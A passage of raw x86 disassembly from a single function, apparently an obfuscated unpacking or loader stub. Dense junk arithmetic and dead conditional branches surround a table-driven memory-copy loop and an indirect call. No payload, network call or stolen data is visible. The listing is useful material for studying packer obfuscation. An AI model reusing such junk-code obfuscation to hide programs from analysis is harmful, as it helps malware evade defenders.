  425e6b:	add    edx,edi
  425e6d:	sub    edx,esi
  425e6f:	add    DWORD PTR [ebp-0x8],edx
  425e72:	sub    DWORD PTR [ebp-0x8],edi
  425e75:	and    ecx,edi
  425e77:	sub    eax,edx
  425e79:	cmp    ebx,DWORD PTR ds:0x438068
  425e7f:	je     0x425edb
  425e81:	mov    ebx,DWORD PTR [ebp-0x8]
  425e84:	xor    edx,edx
  425e86:	cmp    ebx,DWORD PTR ds:0x438068
  425e8c:	je     0x425edb
  425e8e:	mov    esi,DWORD PTR [ebp-0x8]
  425e91:	sub    ecx,edi
  425e93:	add    DWORD PTR [ebp-0x8],edi
  425e96:	add    DWORD PTR [ebp-0x8],edi
  425e99:	add    DWORD PTR [ebp-0x8],ecx
  425e9c:	and    edx,eax
  425e9e:	mov    DWORD PTR [ebp-0x8],edx
  425ea1:	test   esi,0xd1
  425ea7:	jne    0x425edb
  425ea9:	mov    edx,DWORD PTR [ebp-0x8]
  425eac:	mov    eax,ecx
  425eae:	or     DWORD PTR [ebp-0x8],esi
  425eb1:	and    DWORD PTR [ebp-0x8],esi
  425eb4:	sub    eax,ecx
  425eb6:	and    eax,edx
  425eb8:	or     DWORD PTR [ebp-0x8],edi
  425ebb:	sub    ebx,esi
  425ebd:	cmp    ebx,0xffffffb1
  425ec0:	je     0x425edb
  425ec2:	test   ebx,0xfd59
  425ec8:	je     0x425edb
  425eca:	mov    ecx,DWORD PTR [ebp-0x8]
  425ecd:	cmp    edx,DWORD PTR [ebp-0x3c]
  425ed0:	jne    0x425edb
  425ed2:	xor    DWORD PTR [ebp-0x8],eax
  425ed5:	sub    DWORD PTR [ebp-0x8],ecx
  425ed8:	sub    DWORD PTR [ebp-0x8],ebx
  425edb:	push   edi
  425edc:	cmp    ecx,0x47
  425edf:	jne    0x425ee4
  425ee1:	sub    DWORD PTR [ebp-0x8],edi
  425ee4:	push   0x63014
  425ee9:	mov    edi,0xc358
  425eee:	sub    DWORD PTR [ebp-0x8],edi
  425ef1:	push   0x0
  425ef3:	mov    eax,DWORD PTR [ebp-0x8]
  425ef6:	mov    edi,DWORD PTR [ebp-0x8]
  425ef9:	cmp    eax,0xffffffbc
  425efc:	je     0x426087
  425f02:	xor    ebx,ebx
  425f04:	and    DWORD PTR [ebp-0x8],eax
  425f07:	mov    eax,0xb380
  425f0c:	cmp    ecx,0x66
  425f0f:	jne    0x426087
  425f15:	mov    DWORD PTR [ebp-0x28],edi
  425f18:	mov    ecx,DWORD PTR [ebp-0x28]
  425f1b:	test   ecx,0x78
  425f21:	je     0x426087
  425f27:	and    eax,edi
  425f29:	mov    edx,DWORD PTR [ebp-0x8]
  425f2c:	cmp    ecx,ebx
  425f2e:	je     0x426087
  425f34:	or     ecx,eax
  425f36:	sub    DWORD PTR [ebp-0x8],ebx
  425f39:	cmp    ecx,edx
  425f3b:	je     0x426087
  425f41:	add    edx,ecx
  425f43:	mov    ebx,esi
  425f45:	mov    edi,DWORD PTR [ebp-0x28]
  425f48:	add    edx,esi
  425f4a:	add    DWORD PTR [ebp-0x8],edx
  425f4d:	cmp    ebx,eax
  425f4f:	jne    0x426087
  425f55:	mov    ecx,DWORD PTR [ebp-0x28]
  425f58:	mov    DWORD PTR [ebp-0x28],ebx
  425f5b:	cmp    ecx,edi
  425f5d:	jne    0x426087
  425f63:	mov    edx,DWORD PTR [ebp-0x8]
  425f66:	mov    esi,eax
  425f68:	add    DWORD PTR [ebp-0x8],esi
  425f6b:	add    DWORD PTR [ebp-0x8],edx
  425f6e:	test   ecx,0xd4
  425f74:	je     0x426087
  425f7a:	add    ecx,eax
  425f7c:	add    DWORD PTR [ebp-0x28],ecx
  425f7f:	cmp    edi,0x28
  425f82:	je     0x426087
  425f88:	mov    ecx,DWORD PTR [ebp-0x8]
  425f8b:	add    ecx,ecx
  425f8d:	add    ecx,edx
  425f8f:	test   ecx,0x2a
  425f95:	je     0x426087
  425f9b:	add    ecx,esi
  425f9d:	or     DWORD PTR [ebp-0x8],eax
  425fa0:	cmp    edx,DWORD PTR ds:0x438068
  425fa6:	jne    0x426087
  425fac:	sub    edi,ecx
  425fae:	mov    ecx,DWORD PTR ds:0x43808c
  425fb4:	mov    esi,0x79c8
  425fb9:	cmp    edi,ecx
  425fbb:	jne    0x426087
  425fc1:	mov    ebx,edx
  425fc3:	add    esi,edx
  425fc5:	add    DWORD PTR [ebp-0x28],edx
  425fc8:	xor    edx,edx
  425fca:	sub    edi,ecx
  425fcc:	cmp    esi,0x5b
  425fcf:	je     0x426087
  425fd5:	cmp    edi,0xffffffd9
  425fd8:	je     0x426087
  425fde:	mov    eax,DWORD PTR [ebp-0x8]
  425fe1:	mov    ecx,DWORD PTR [ebp-0x28]
  425fe4:	sub    ecx,ebx
  425fe6:	add    DWORD PTR [ebp-0x8],esi
  425fe9:	sub    DWORD PTR [ebp-0x28],edi
  425fec:	and    ecx,edx
  425fee:	or     eax,ebx
  425ff0:	sub    DWORD PTR [ebp-0x28],ecx
  425ff3:	cmp    eax,DWORD PTR [ebp-0x30]
  425ff6:	je     0x426087
  425ffc:	cmp    esi,0xffffffdd
  425fff:	je     0x426087
  426005:	mov    ebx,edx
  426007:	mov    DWORD PTR [ebp-0x8],ebx
  42600a:	sub    eax,ecx
  42600c:	sub    eax,ecx
  42600e:	mov    ecx,0xfd
  426013:	sub    ecx,esi
  426015:	cmp    eax,DWORD PTR ds:0x43808c
  42601b:	je     0x426087
  42601d:	sub    DWORD PTR [ebp-0x8],ecx
  426020:	xor    edx,edx
  426022:	mov    ebx,DWORD PTR ds:0x43806c
  426028:	cmp    eax,0xfffffffa
  42602b:	je     0x426087
  42602d:	mov    edi,0xe3b2
  426032:	cmp    eax,0xa52f
  426037:	je     0x426087
  426039:	mov    ebx,eax
  42603b:	mov    esi,DWORD PTR [ebp-0x8]
  42603e:	add    DWORD PTR [ebp-0x8],edx
  426041:	add    edi,edx
  426043:	cmp    esi,0x6b00
  426049:	jne    0x426087
  42604b:	cmp    ecx,0x102a682
  426051:	je     0x426087
  426053:	cmp    ebx,0xffffffa2
  426056:	jne    0x426087
  426058:	mov    edx,DWORD PTR [ebp-0x8]
  42605b:	sub    edx,eax
  42605d:	cmp    esi,0xffffff97
  426060:	jne    0x426087
  426062:	mov    ecx,DWORD PTR ds:0x43806c
  426068:	sub    DWORD PTR [ebp-0x28],esi
  42606b:	and    DWORD PTR [ebp-0x28],edx
  42606e:	mov    esi,0x65
  426073:	add    DWORD PTR [ebp-0x28],esi
  426076:	sub    DWORD PTR [ebp-0x28],ebx
  426079:	sub    edi,edx
  42607b:	sub    edi,edx
  42607d:	add    edi,ebx
  42607f:	add    edi,edi
  426081:	sub    DWORD PTR [ebp-0x28],ecx
  426084:	sub    DWORD PTR [ebp-0x28],edi
  426087:	mov    eax,0x88bad700
  42608c:	sub    esi,eax
  42608e:	sub    DWORD PTR [ebp-0x8],esi
  426091:	sub    eax,0x88777c7c
  426096:	mov    esi,DWORD PTR [ebp-0x8]
  426099:	cmp    ebx,0xffffffac
  42609c:	jne    0x4260d9
  42609e:	mov    ebx,0xf9
  4260a3:	add    DWORD PTR [ebp-0x8],ecx
  4260a6:	mov    ecx,0x26
  4260ab:	or     DWORD PTR [ebp-0x8],eax
  4260ae:	test   edi,0xe8
  4260b4:	je     0x4260d9
  4260b6:	cmp    esi,0x12
  4260b9:	je     0x4260d9
  4260bb:	mov    edx,0xd7
  4260c0:	sub    ecx,eax
  4260c2:	mov    edi,DWORD PTR ds:0x438068
  4260c8:	add    DWORD PTR [ebp-0x8],edi
  4260cb:	sub    DWORD PTR [ebp-0x8],esi
  4260ce:	add    DWORD PTR [ebp-0x8],ecx
  4260d1:	mov    DWORD PTR [ebp-0x8],ebx
  4260d4:	and    edx,edi
  4260d6:	and    DWORD PTR [ebp-0x8],edx
  4260d9:	call   DWORD PTR [eax]
  4260db:	sub    ebx,esi
  4260dd:	mov    esi,0x3b000481
  4260e2:	sub    DWORD PTR [ebp-0x8],esi
  4260e5:	sub    ebx,edi
  4260e7:	mov    ecx,DWORD PTR [ebp-0x8]
  4260ea:	cmp    ebx,edi
  4260ec:	jne    0x42626d
  4260f2:	or     ecx,ebx
  4260f4:	mov    edi,DWORD PTR ds:0x438094
  4260fa:	mov    esi,DWORD PTR [ebp-0x8]
  4260fd:	or     edi,esi
  4260ff:	cmp    ecx,eax
  426101:	jne    0x42626d
  426107:	add    ecx,edi
  426109:	mov    edx,edi
  42610b:	cmp    eax,DWORD PTR [ebp-0x34]
  42610e:	jne    0x42626d
  426114:	mov    esi,DWORD PTR [ebp-0x8]
  426117:	mov    ebx,DWORD PTR [ebp-0x8]
  42611a:	sub    DWORD PTR [ebp-0x8],esi
  42611d:	cmp    ebx,DWORD PTR ds:0x43808c
  426123:	je     0x42626d
  426129:	test   ecx,0x73
  42612f:	jne    0x42626d
  426135:	add    DWORD PTR [ebp-0x8],ebx
  426138:	mov    edi,DWORD PTR ds:0x43806c
  42613e:	mov    ebx,DWORD PTR [ebp-0x8]
  426141:	add    DWORD PTR [ebp-0x8],ecx
  426144:	cmp    ebx,DWORD PTR ds:0x438094
  42614a:	je     0x42626d
  426150:	xor    esi,esi
  426152:	mov    ecx,eax
  426154:	and    edi,esi
  426156:	add    ecx,ecx
  426158:	cmp    ebx,DWORD PTR [ebp-0x4]
  42615b:	jne    0x42626d
  426161:	mov    edi,ebx
  426163:	sub    edi,ebx
  426165:	and    edx,esi
  426167:	mov    ebx,DWORD PTR [ebp-0x8]
  42616a:	cmp    ebx,0x25808400
  426170:	je     0x42626d
  426176:	add    DWORD PTR [ebp-0x8],ecx
  426179:	mov    esi,0x1d
  42617e:	mov    ecx,DWORD PTR [ebp-0x8]
  426181:	cmp    edx,DWORD PTR [ebp-0x34]
  426184:	je     0x42626d
  42618a:	sub    DWORD PTR [ebp-0x8],edi
  42618d:	mov    edi,DWORD PTR [ebp-0x8]
  426190:	add    DWORD PTR [ebp-0x8],esi
  426193:	cmp    ecx,DWORD PTR [ebp-0x20]
  426196:	je     0x42626d
  42619c:	mov    esi,ecx
  42619e:	xor    ecx,ecx
  4261a0:	add    ebx,edi
  4261a2:	mov    DWORD PTR [ebp-0x8],ebx
  4261a5:	sub    DWORD PTR [ebp-0x8],ecx
  4261a8:	sub    esi,eax
  4261aa:	and    edx,eax
  4261ac:	cmp    edx,DWORD PTR [ebp-0x24]
  4261af:	jne    0x42626d
  4261b5:	mov    ecx,eax
  4261b7:	mov    ebx,DWORD PTR [ebp-0x8]
  4261ba:	add    ecx,edx
  4261bc:	test   esi,0xa3
  4261c2:	je     0x42626d
  4261c8:	mov    edi,DWORD PTR [ebp-0x8]
  4261cb:	sub    DWORD PTR [ebp-0x8],ebx
  4261ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4261d1:	and    ebx,edi
  4261d3:	cmp    ecx,ebx
  4261d5:	je     0x42626d
  4261db:	mov    edi,DWORD PTR [ebp-0x8]
  4261de:	add    DWORD PTR [ebp-0x8],ebx
  4261e1:	mov    edx,ecx
  4261e3:	sub    DWORD PTR [ebp-0x8],eax
  4261e6:	cmp    edi,0xf204
  4261ec:	je     0x42626d
  4261ee:	and    edi,eax
  4261f0:	mov    ecx,DWORD PTR ds:0x43806c
  4261f6:	mov    ebx,DWORD PTR [ebp-0x8]
  4261f9:	mov    DWORD PTR [ebp-0x8],edi
  4261fc:	sub    DWORD PTR [ebp-0x8],edx
  4261ff:	add    esi,esi
  426201:	sub    ecx,edi
  426203:	add    DWORD PTR [ebp-0x8],ebx
  426206:	cmp    esi,DWORD PTR ds:0x43808c
  42620c:	jne    0x42626d
  42620e:	sub    esi,ecx
  426210:	cmp    esi,0x4b8f
  426216:	jne    0x42626d
  426218:	cmp    esi,DWORD PTR [ebp-0x2c]
  42621b:	jne    0x42626d
  42621d:	cmp    esi,ebx
  42621f:	jne    0x42626d
  426221:	mov    edx,DWORD PTR [ebp-0x8]
  426224:	mov    edi,eax
  426226:	or     edi,ecx
  426228:	sub    esi,eax
  42622a:	cmp    ebx,edx
  42622c:	je     0x42626d
  42622e:	cmp    edi,0xffffff98
  426231:	jne    0x42626d
  426233:	mov    ecx,DWORD PTR [ebp-0x8]
  426236:	sub    DWORD PTR [ebp-0x8],edi
  426239:	mov    edi,ebx
  42623b:	or     ecx,ebx
  42623d:	or     DWORD PTR [ebp-0x8],ecx
  426240:	sub    DWORD PTR [ebp-0x8],edx
  426243:	and    esi,ecx
  426245:	sub    esi,edx
  426247:	add    esi,ebx
  426249:	cmp    ebx,0xffffffbb
  42624c:	jne    0x42626d
  42624e:	or     edi,ebx
  426250:	add    esi,esi
  426252:	or     edi,ecx
  426254:	mov    ebx,DWORD PTR ds:0x438094
  42625a:	mov    DWORD PTR [ebp-0x8],edi
  42625d:	mov    ecx,edi
  42625f:	and    esi,edx
  426261:	and    ebx,ecx
  426263:	add    esi,edx
  426265:	sub    esi,eax
  426267:	and    DWORD PTR [ebp-0x8],ebx
  42626a:	add    DWORD PTR [ebp-0x8],esi
  42626d:	mov    DWORD PTR [ebp-0x14],eax
  426270:	mov    esi,0xc8
  426275:	mov    eax,DWORD PTR [ebp-0x8]
  426278:	test   eax,0xa8
  42627d:	je     0x4262af
  42627f:	add    DWORD PTR [ebp-0x8],esi
  426282:	mov    esi,DWORD PTR ds:0x43808c
  426288:	cmp    eax,ebx
  42628a:	jne    0x4262af
  42628c:	and    esi,eax
  42628e:	mov    ecx,DWORD PTR [ebp-0x8]
  426291:	add    esi,edi
  426293:	cmp    eax,DWORD PTR [ebp-0x28]
  426296:	je     0x4262af
  426298:	mov    edi,0xf6
  42629d:	mov    ebx,DWORD PTR [ebp-0x8]
  4262a0:	and    edi,edx
  4262a2:	add    edi,edi
  4262a4:	and    DWORD PTR [ebp-0x8],ecx
  4262a7:	xor    DWORD PTR [ebp-0x8],edi
  4262aa:	sub    esi,ebx
  4262ac:	sub    DWORD PTR [ebp-0x8],esi
  4262af:	mov    edx,0x1067ccc3
  4262b4:	cmp    ebx,0xfffffffa
  4262b7:	jne    0x4262e4
  4262b9:	mov    eax,0x9257
  4262be:	mov    ebx,edx
  4262c0:	cmp    ecx,DWORD PTR [ebp-0x28]
  4262c3:	je     0x4262e4
  4262c5:	sub    DWORD PTR [ebp-0x8],eax
  4262c8:	mov    ecx,edi
  4262ca:	cmp    esi,DWORD PTR ds:0x43806c
  4262d0:	jne    0x4262e4
  4262d2:	sub    DWORD PTR [ebp-0x8],ecx
  4262d5:	sub    ebx,edi
  4262d7:	sub    ebx,edx
  4262d9:	cmp    ebx,DWORD PTR ds:0x438094
  4262df:	jne    0x4262e4
  4262e1:	or     DWORD PTR [ebp-0x8],ebx
  4262e4:	add    edx,0xefdbb33d
  4262ea:	mov    ecx,DWORD PTR [ebp-0x8]
  4262ed:	cmp    ecx,DWORD PTR ds:0x43808c
  4262f3:	jne    0x426303
  4262f5:	mov    eax,ebx
  4262f7:	or     ecx,edi
  4262f9:	mov    esi,eax
  4262fb:	or     ecx,esi
  4262fd:	add    DWORD PTR [ebp-0x8],esi
  426300:	add    DWORD PTR [ebp-0x8],ecx
  426303:	mov    DWORD PTR [ebp-0x1c],edx
  426306:	mov    esi,0x3c
  42630b:	mov    edx,edi
  42630d:	add    esi,ebx
  42630f:	or     DWORD PTR [ebp-0x8],esi
  426312:	sub    edx,ecx
  426314:	add    DWORD PTR [ebp-0x8],edx
  426317:	mov    edi,DWORD PTR [ebp-0x14]
  42631a:	cmp    edi,DWORD PTR [ebp-0x34]
  42631d:	jne    0x426387
  42631f:	mov    eax,DWORD PTR [ebp-0x8]
  426322:	mov    ecx,DWORD PTR [ebp-0x8]
  426325:	cmp    ecx,DWORD PTR [ebp-0x24]
  426328:	je     0x426387
  42632a:	add    DWORD PTR [ebp-0x8],ecx
  42632d:	sub    DWORD PTR [ebp-0x8],edi
  426330:	test   eax,0x252a8220
  426335:	jne    0x426387
  426337:	sub    eax,ecx
  426339:	cmp    eax,esi
  42633b:	jne    0x426387
  42633d:	mov    ecx,0x87db
  426342:	sub    ecx,edi
  426344:	mov    ebx,DWORD PTR [ebp-0x8]
  426347:	add    ebx,eax
  426349:	add    ecx,edi
  42634b:	or     DWORD PTR [ebp-0x8],ecx
  42634e:	cmp    ebx,0x3909
  426354:	je     0x426387
  426356:	sub    ebx,edi
  426358:	mov    eax,DWORD PTR ds:0x438068
  42635e:	add    DWORD PTR [ebp-0x8],ebx
  426361:	add    eax,ebx
  426363:	sub    eax,ecx
  426365:	sub    eax,edx
  426367:	or     eax,ebx
  426369:	cmp    eax,DWORD PTR ds:0x43806c
  42636f:	jne    0x426387
  426371:	add    DWORD PTR [ebp-0x8],esi
  426374:	mov    ebx,0x2
  426379:	add    DWORD PTR [ebp-0x8],eax
  42637c:	mov    edx,0x17
  426381:	add    DWORD PTR [ebp-0x8],edx
  426384:	sub    DWORD PTR [ebp-0x8],ebx
  426387:	mov    ecx,edx
  426389:	sub    ecx,edx
  42638b:	cmp    eax,0xffffffef
  42638e:	jne    0x4263a0
  426390:	mov    ecx,0xfd2a
  426395:	mov    eax,0xf6
  42639a:	xor    DWORD PTR [ebp-0x8],ecx
  42639d:	sub    DWORD PTR [ebp-0x8],eax
  4263a0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4263a3:	mov    ebx,DWORD PTR [ebp-0x8]
  4263a6:	cmp    ebx,0xffffffb7
  4263a9:	je     0x4263dc
  4263ab:	add    DWORD PTR [ebp-0x8],ecx
  4263ae:	mov    esi,ebx
  4263b0:	cmp    esi,DWORD PTR ds:0x438094
  4263b6:	jne    0x4263dc
  4263b8:	cmp    esi,0xffffff9a
  4263bb:	jne    0x4263dc
  4263bd:	cmp    esi,0xeb09c001
  4263c3:	jne    0x4263dc
  4263c5:	mov    ebx,ecx
  4263c7:	and    ebx,ecx
  4263c9:	cmp    esi,DWORD PTR [ebp-0x20]
  4263cc:	je     0x4263dc
  4263ce:	or     DWORD PTR [ebp-0x8],edx
  4263d1:	cmp    esi,DWORD PTR [ebp-0x18]
  4263d4:	je     0x4263dc
  4263d6:	add    DWORD PTR [ebp-0x8],esi
  4263d9:	add    DWORD PTR [ebp-0x8],ebx
  4263dc:	mov    esi,DWORD PTR [ecx]
  4263de:	mov    ebx,0x27
  4263e3:	mov    DWORD PTR [ebp-0x8],ebx
  4263e6:	mov    ecx,DWORD PTR [ecx+0x4]
  4263e9:	cmp    ecx,0x4902
  4263ef:	je     0x4263f7
  4263f1:	mov    ebx,DWORD PTR [ebp-0x8]
  4263f4:	or     DWORD PTR [ebp-0x8],ebx
  4263f7:	or     esi,esi
  4263f9:	je     0x426457
  4263fb:	add    DWORD PTR [ebp-0x8],eax
  4263fe:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426400:	or     ecx,edx
  426402:	mov    ebx,DWORD PTR ds:0x43808c
  426408:	cmp    ecx,0xffffff88
  42640b:	jne    0x42644b
  42640d:	sub    ecx,edx
  42640f:	add    DWORD PTR [ebp-0x8],edi
  426412:	cmp    esi,edx
  426414:	je     0x42644b
  426416:	add    ecx,eax
  426418:	cmp    ecx,0x53
  42641b:	je     0x42644b
  42641d:	sub    ecx,edx
  42641f:	add    ecx,ecx
  426421:	cmp    ecx,DWORD PTR [ebp-0x28]
  426424:	je     0x42644b
  426426:	cmp    ecx,0x1a
  426429:	jne    0x42644b
  42642b:	mov    ebx,DWORD PTR [ebp-0x8]
  42642e:	add    ebx,ebx
  426430:	test   esi,0x47
  426436:	jne    0x42644b
  426438:	cmp    esi,0x7db1
  42643e:	je     0x42644b
  426440:	sub    ebx,eax
  426442:	add    ebx,edx
  426444:	add    ebx,ecx
  426446:	mov    ecx,ebx
  426448:	sub    DWORD PTR [ebp-0x8],ecx
  42644b:	add    DWORD PTR [ebp-0x1c],0x8
  42644f:	add    DWORD PTR [ebp-0x8],esi
  426452:	jmp    0x42631a
  426457:	sub    DWORD PTR [ebp-0x8],esi
  42645a:	xor    ebx,ebx
  42645c:	mov    edi,ebx
  42645e:	sub    edi,ebx
  426460:	add    DWORD PTR [ebp-0x8],edi
  426463:	mov    eax,DWORD PTR [ebp-0x14]
  426466:	mov    edi,0xd2
  42646b:	xor    edx,edx
  42646d:	add    DWORD PTR [ebp-0x8],eax
  426470:	and    edi,ebx
  426472:	sub    edx,eax
  426474:	and    edi,eax
  426476:	test   edi,0x3f
  42647c:	je     0x4264a0
  42647e:	mov    esi,DWORD PTR [ebp-0x8]
  426481:	cmp    esi,0xffffff8d
  426484:	je     0x4264a0
  426486:	sub    DWORD PTR [ebp-0x8],esi
  426489:	cmp    edx,edi
  42648b:	je     0x4264a0
  42648d:	mov    ebx,0xbd
  426492:	add    DWORD PTR [ebp-0x8],edx
  426495:	or     ebx,edx
  426497:	xor    esi,esi
  426499:	add    edi,ebx
  42649b:	sub    esi,edi
  42649d:	add    DWORD PTR [ebp-0x8],esi
  4264a0:	cmp    edx,eax
  4264a2:	je     0x4264b4
  4264a4:	mov    ebx,DWORD PTR [ebp-0x8]
  4264a7:	mov    edx,0x19c6
  4264ac:	sub    DWORD PTR [ebp-0x8],edx
  4264af:	add    ebx,ebx
  4264b1:	add    DWORD PTR [ebp-0x8],ebx
  4264b4:	pop    edi
  4264b5:	add    DWORD PTR [ebp-0x8],edi
  4264b8:	pop    esi
  4264b9:	mov    ebx,edx
  4264bb:	mov    edx,DWORD PTR [ebp-0x8]
  4264be:	add    edx,ebx
  4264c0:	sub    edx,eax
  4264c2:	add    edx,eax
  4264c4:	test   edx,0xf265
  4264ca:	je     0x42650e
  4264cc:	mov    ecx,DWORD PTR ds:0x43806c
  4264d2:	xor    ebx,ebx
  4264d4:	add    edx,edi
  4264d6:	sub    DWORD PTR [ebp-0x8],ebx
  4264d9:	add    ecx,eax
  4264db:	cmp    ecx,DWORD PTR [ebp-0x20]
  4264de:	jne    0x42650e
  4264e0:	and    ecx,eax
  4264e2:	add    edx,edi
  4264e4:	add    DWORD PTR [ebp-0x8],ecx
  4264e7:	mov    ecx,DWORD PTR [ebp-0x8]
  4264ea:	mov    ebx,DWORD PTR ds:0x43808c
  4264f0:	cmp    esi,0xffffffcd
  4264f3:	je     0x42650e
  4264f5:	add    ebx,ebx
  4264f7:	sub    edx,ebx
  4264f9:	mov    ebx,DWORD PTR [ebp-0x8]
  4264fc:	and    ebx,edx
  4264fe:	sub    DWORD PTR [ebp-0x8],esi
  426501:	sub    ebx,ecx
  426503:	add    ebx,edx
  426505:	sub    ebx,edx
  426507:	add    ebx,edi
  426509:	sub    ebx,edx
  42650b:	sub    DWORD PTR [ebp-0x8],ebx
  42650e:	pop    ebx
  42650f:	add    ecx,edx
  426511:	add    ecx,esi
  426513:	add    DWORD PTR [ebp-0x8],ecx
  426516:	leave  
  426517:	ret    
